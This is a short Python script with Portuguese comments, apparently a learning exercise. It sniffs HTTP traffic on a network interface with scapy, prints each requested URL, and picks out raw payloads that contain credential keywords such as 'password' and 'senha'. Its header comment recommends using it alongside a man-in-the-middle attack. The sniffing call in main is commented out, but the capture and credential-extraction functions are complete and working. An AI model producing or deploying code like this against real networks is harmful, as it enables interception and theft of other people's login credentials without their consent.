# sniffer de rede para ouvir o tráfego descriptografado da rede
# recomenda-se utilizar com um ataque man-in-the-middle
import argparse
import scapy.all as scapy
from scapy_http import http
import os


def obterArgumentos():
    """
    Obtem argumentos para interface
    :return:
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Nome de interface")
    opcoes = parser.parse_args()
    return opcoes


def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)


def obterUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def obterCredenciais(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "password", "user", "username", "pass", "usuario"
, "senha", "contrasena", "logon", "access"]
        for kw in keywords:
            if kw in load:
                return load


def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = obterUrl(packet)
        print(f"HTTP Request >> {url}")
        credenciais = obterCredenciais(packet)
        if credenciais:
            print(f"Possíveis password/username: {credenciais}")


if __name__ == '__main__':
    options = obterArgumentos()
    #sniff_packet(options.interface)
    print(os.sys.path)